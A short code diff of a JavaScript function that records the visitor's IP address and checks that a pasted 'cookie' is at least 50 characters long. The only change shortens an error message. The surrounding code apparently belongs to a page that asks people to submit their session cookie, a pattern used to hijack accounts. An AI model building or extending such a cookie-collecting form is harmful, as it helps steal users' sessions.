@@ -9,7 +9,7 @@ function Send() {
     ip = result.ip;
     })
   if (document.getElementById("CookieInput").value.length < 50 ) {
-    document.getElementById("CookieError").innerHTML = "Please Enter A Valid Cookie." // checks to see if they actually entered a possibly valid cookie
+    document.getElementById("CookieError").innerHTML = "Enter A Valid Cookie." // checks to see if they actually entered a possibly valid cookie
     document.getElementById("CookieError").style.color = "red";
     throw new Error("end")
   }
